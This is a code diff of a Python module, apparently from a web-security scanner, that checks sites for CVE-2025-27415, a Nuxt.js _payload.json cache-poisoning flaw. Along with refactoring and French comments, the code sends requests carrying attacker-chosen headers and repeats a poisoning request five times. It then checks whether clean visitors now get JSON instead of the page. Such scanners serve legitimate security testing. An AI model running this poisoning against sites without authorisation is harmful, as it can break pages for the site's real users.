@@ -1,164 +1,127 @@
 #!/usr/bin/env python3
-
 """
 Based on Zhero research
 https://zhero-web-sec.github.io/research-and-things/nuxt-show-me-your-payload
 """
 
+from urllib.parse import urljoin
 from modules.cp_cve.unrisk_page import get_unrisk_page
 from utils.style import Colors, Identify
-from utils.utils import configure_logger, requests, sys, urljoin
+from utils.utils import configure_logger, requests
 
 logger = configure_logger(__name__)
+
+# Status codes à exclure des détections par status différent
+EXCLUDED_STATUS_CODES = {401, 403, 404, 429, 500, 503}
 
 
 def is_json_response(response: requests.Response) -> bool:
     """
-    Vérifie si une réponse est du JSON (par parsing ou Content-Type)
-    
-    Args:
-        response: Réponse HTTP
-        
-    Returns:
-        True si la réponse est JSON
+    Vérifie si une réponse est du JSON (par Content-Type d'abord, puis parsing)
     """
+    if "application/json" in response.headers.get("Content-Type", ""):
+        return True
     try:
         response.json()
         return True
-    except requests.exceptions.JSONDecodeError:
-        return "application/json" in response.headers.get("Content-Type", "")
+    except ValueError:
+        return False
 
 
 def build_payload_url(base_url: str) -> str:
     """
-    Construit l'URL du payload Nuxt.js
-    
-    Args:
-        base_url: URL de base
-        
-    Returns:
-        URL du fichier _payload.json
+    Construit l'URL du payload Nuxt.js via urljoin
     """
-    if base_url.endswith("/"):
-        return f"{base_url}_payload.json"
-    else:
-        return f"{base_url}/_payload.json"
-
+    return urljoin(base_url.rstrip("/") + "/", "?/_payload.json")
+    
 
 def test_nuxt_poisoning(
     poison_url: str,
-    baseline_url: str,
+    req_baseline: requests.Response,
     s: requests.Session,
     custom_header: dict,
     authent: tuple[str, str] | None,
 ) -> tuple[bool, str]:
     """
     Teste l'empoisonnement du cache Nuxt.js
-    
+
     Args:
-        poison_url: URL du payload _payload.json
-        baseline_url: URL de base pour comparaison
+        poison_url: URL du _payload.json
+        req_baseline: Réponse baseline déjà effectuée (réutilisée)
         s: Session requests
-        custom_header: Headers personnalisés
+        custom_header: Headers malveillants
         authent: Credentials optionnels
-        
+
     Returns:
         Tuple (is_vulnerable, detection_type)
     """
-    try:
-        # Requête baseline sans cache poisoning
-        req_baseline = s.get(
-            baseline_url,
-            verify=False,
-            auth=authent,
-            timeout=10,
-            allow_redirects=False,
+    req_poison = s.get(
+        poison_url,
+        verify=False,
+        auth=authent,
+        headers=custom_header,
+        timeout=10,
+        allow_redirects=False,
+    )
+
+    # Détection 1: Réponse JSON sur _payload.json
+    if is_json_response(req_poison):
+        return (True, "JSON_RESPONSE")
+
+    # Détection 2: Status code différent et non exclu
+    if (
+        req_poison.status_code != req_baseline.status_code
+        and req_poison.status_code not in EXCLUDED_STATUS_CODES
+    ):
+        return (
+            True,
+            f"DIFFERENT_STATUS {req_baseline.status_code} > {req_poison.status_code}",
         )
 
-        # Requête vers _payload.json avec headers malveillants
-        req_poison = s.get(
-            poison_url,
-            verify=False,
-            auth=authent,
-            headers=custom_header,
-            timeout=10,
-            allow_redirects=False,
-        )
-        
-        # Détection 1: Réponse JSON sur _payload.json
-        if is_json_response(req_poison):
-            return (True, "JSON_RESPONSE")
-        
-        # Détection 2: Status code différent (et non erreur commune)
-        if (
-            req_poison.status_code != req_baseline.status_code
-            and req_poison.status_code not in [404, 429, 403]
-        ):
-            return (True, f"DIFFERENT_STATUS {req_baseline.status_code} > {req_poison.status_code}")
-        
-        return (False, "NO_DETECTION")
-        
-    except Exception as e:
-        logger.exception(f"Error testing Nuxt poisoning: {e}")
-        return (False, f"ERROR: {e}")
+    return (False, "NO_DETECTION")
 
 
 def verify_cache_persistence(
-    poison_url: str,
-    baseline_url: str,
+    base_url: str,
+    req_baseline: requests.Response,
     s: requests.Session,
-    custom_header: dict,
     authent: tuple[str, str] | None,
 ) -> tuple[bool, str]:
     """
-    Vérifie la persistence du cache empoisonné
-    
+    Vérifie la persistence du cache empoisonné SANS header malveillant.
+
+    On NE re-teste PAS l'URL `?/_payload.json` (qui renvoie du JSON par nature),
+    mais bien la *page de base* : si une requête propre sur la page HTML renvoie
+    désormais le payload JSON — alors que la baseline était du HTML — le cache
+    est effectivement empoisonné.
+
     Args:
-        poison_url: URL du payload _payload.json
-        baseline_url: URL de base
+        base_url: URL de la page de base (page sans risque, sans `?/_payload.json`)
+        req_baseline: réponse baseline de cette page (attendue : HTML, non-JSON)
         s: Session requests
-        custom_header: Headers personnalisés
         authent: Credentials optionnels
-        
+
     Returns:
         Tuple (is_persisted, detection_type)
     """
-    try:
-        # Requête baseline pour référence
-        req_baseline = s.get(
-            baseline_url,
-            verify=False,
-            auth=authent,
-            timeout=10,
-            allow_redirects=False,
-        )
-        
-        # Requête de vérification SANS headers malveillants
-        req_verify = s.get(
-            baseline_url,
-            verify=False,
-            auth=authent,
-            headers=custom_header,
-            timeout=10,
-            allow_redirects=False,
-        )
-        
-        # Vérification de persistence via JSON
-        if is_json_response(req_verify):
-            return (True, "CACHE_POISONED_JSON")
-        
-        # Vérification via status code
-        if (
-            req_verify.status_code != req_baseline.status_code
-            and req_verify.status_code not in [404, 429, 403]
-        ):
-            return (True, f"CACHE_POISONED_STATUS {req_baseline.status_code} > {req_verify.status_code}")
-        
-        return (False, "NO_PERSISTENCE")
-        
-    except Exception as e:
-        logger.exception(f"Error verifying cache persistence: {e}")
-        return (False, f"ERROR: {e}")
+    # La baseline ne doit pas déjà être du JSON, sinon aucune conclusion possible.
+    if is_json_response(req_baseline):
+        return (False, "BASELINE_ALREADY_JSON")
+
+    # Requête propre sur la page de base — aucun header malveillant.
+    req_verify = s.get(
+        base_url,
+        verify=False,
+        auth=authent,
+        timeout=10,
+        allow_redirects=False,
+    )
+
+    # Empoisonné si la page HTML sert maintenant du JSON à un client propre.
+    if is_json_response(req_verify):
+        return (True, "CACHE_POISONED_JSON")
+
+    return (False, "NO_PERSISTENCE")
 
 
 def nuxt_check(
@@ -167,77 +130,69 @@ def nuxt_check(
     req_main: requests.Response,
     custom_header: dict,
     authent: tuple[str, str] | None,
-) -> None:
+) -> bool:
     """
     Vérifie la vulnérabilité CVE-2025-27415 (Nuxt.js _payload.json cache poisoning)
-    
-    Args:
-        url: URL cible
-        s: Session requests
-        req_main: Réponse baseline de la page
-        custom_header: Headers personnalisés
-        authent: Credentials optionnels
     """
     try:
-        # Recherche d'une page sans risque
         unrisk_page = get_unrisk_page(url, s, req_main)
-        
+
         if not unrisk_page:
             print(
-                " └─ [i] [CVE-2025-27415] Seems Nuxt.js framework is used, but no risk-free pages found. Manual check required."
+                " └─ [i] [CVE-2025-27415] Seems Nuxt.js framework is used,"
+                " but no risk-free pages found. Manual check required."
             )
-            return
-        
-        # Construction de l'URL du payload
+            return False
+
         poison_url = build_payload_url(unrisk_page)
-        
-        # Test d'empoisonnement initial
-        is_vulnerable, detection_type = test_nuxt_poisoning(
-            poison_url,
-            unrisk_page,
-            s,
-            custom_header,
-            authent
+
+        # Baseline unique — réutilisée dans test_nuxt_poisoning
+        req_baseline = s.get(
+            unrisk_page, verify=False, auth=authent,
+            timeout=10, allow_redirects=False,
         )
-        
-        if is_vulnerable:
+
+        is_vulnerable, detection_type = test_nuxt_poisoning(
+            poison_url, req_baseline, s, custom_header, authent
+        )
+
+        if not is_vulnerable:
+            return False
+
+        print(
+            f" {Identify.behavior} | CVE-2025-27415 | {detection_type}"
+            f" | {Colors.BLUE}{poison_url}{Colors.RESET}"
+        )
+
+        # Empoisonnement avec gestion d'erreur
+        for _ in range(5):
+            try:
+                s.get(poison_url, verify=False, auth=authent,
+                      headers=custom_header, timeout=10, allow_redirects=False)
+            except requests.exceptions.RequestException as e:
+                logger.error("poison request failed %s: %s", poison_url, e)
+                break
+
+        # Vérification de persistence SANS header malveillant, sur la page de base
+        is_persisted, persist_type = verify_cache_persistence(
+            unrisk_page, req_baseline, s, authent
+        )
+
+        if is_persisted:
             print(
-                f" {Identify.behavior} | CVE-2025-27415 | {detection_type} | {Colors.BLUE}{poison_url}{Colors.RESET}"
+                f" {Identify.confirmed} | CVE-2025-27415 | {persist_type}"
+                f" | {Colors.BLUE}{poison_url}{Colors.RESET}"
             )
-            
-            # Empoisonnement du cache
-            for _ in range(5):
-                s.get(
-                    poison_url,
-                    verify=False,
-                    auth=authent,
-                    headers=custom_header,
-                    timeout=10,
-                    allow_redirects=False,
-                )
-            
-            # Vérification de la persistence
-            is_persisted, persist_type = verify_cache_persistence(
-                poison_url,
-                unrisk_page,
-                s,
-                custom_header,
-                authent
-            )
-            
-            if is_persisted:
-                print(
-                    f" {Identify.confirmed} | CVE-2025-27415 | {persist_type} | {Colors.BLUE}{poison_url}{Colors.RESET}"
-                )
-            else:
-                print(
-                    f" └─ [i] Vulnerability detected but cache not persistently poisoned"
-                )
-        
-    except requests.Timeout as t:
-        logger.error(f"request timeout: {t}")
-    except KeyboardInterrupt:
-        print("Exiting")
-        sys.exit()
+            return True
+
+        print(" └─ [i] Vulnerability detected but cache not persistently poisoned")
+        return False
+
+    except requests.exceptions.Timeout:
+        logger.error("request timeout %s", url)
+    except requests.exceptions.ConnectionError as e:
+        logger.error("connection error %s: %s", url, e)
     except Exception as e:
-        logger.exception(f"Error checking CVE-2025-27415: {e}")
+        logger.error("error checking CVE-2025-27415 %s: %s", url, e)
+
+    return False
